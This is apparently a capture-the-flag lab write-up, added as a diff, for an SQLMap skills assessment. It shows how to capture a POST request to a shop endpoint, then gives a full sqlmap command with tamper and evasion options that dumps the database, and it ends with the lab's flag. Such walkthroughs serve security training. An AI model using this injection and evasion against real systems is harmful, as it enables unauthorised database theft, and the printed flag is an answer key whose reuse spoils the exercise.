@@ -1,1 +1,51 @@
 
+Skills Assessment
+You are given access to a web application with basic protection mechanisms. Use the skills learned in this module to find the SQLi vulnerability with SQLMap and exploit it accordingly. To complete this module, find the flag and submit it here.
+
+CHALLENGE: 94.237.63.90:49172
+
+Question 1 - What's the contents of table final_flag? 
+1) go to web page at -> http://94.237.63.90:49172/ 
+2) click all buttons while having the Network tab of the Web Developer tools open, searching for a POST request that can be abused.
+3)  The only button that sends a POST request is under Catalog -> Shop, specifically, the ADD TO CART + button on an item
+4) there will be a pop up like XSS and say item added!!! 
+5) in network tab get the post request -> show raw for request header should look like ->
+POST /action.php HTTP/1.1
+Host: 94.237.63.90:49172
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://94.237.63.90:49172/shop.html
+Content-Type: application/json
+Content-Length: 8
+Origin: http://94.237.63.90:49172
+DNT: 1
+Connection: keep-alive
+Sec-GPC: 1
+Priority: u=0
+
+6) then in Request tab -> show raw -> {"id":1} add to bottom of header request so final will look like -> 
+
+POST /action.php HTTP/1.1
+Host: 94.237.63.90:49172
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://94.237.63.90:49172/shop.html
+Content-Type: application/json
+Content-Length: 8
+Origin: http://94.237.63.90:49172
+DNT: 1
+Connection: keep-alive
+Sec-GPC: 1
+Priority: u=0
+
+{"id":1}
+
+7) save as txt file 
+8) sqlmap providing it to the option -r. After trial and error, students will come to know that the options --level 5, --risk 3, --random-agent, --tamper=between, and --technique=t are all required to bypass the protections put forth to protect the database.
+
+9) sqlmap -r req.txt --batch --dump --level 5 --risk 3 --random-agent --tamper=between --technique=t
+10) output: HTB{n07_50_h4rd_r16h7?!} 
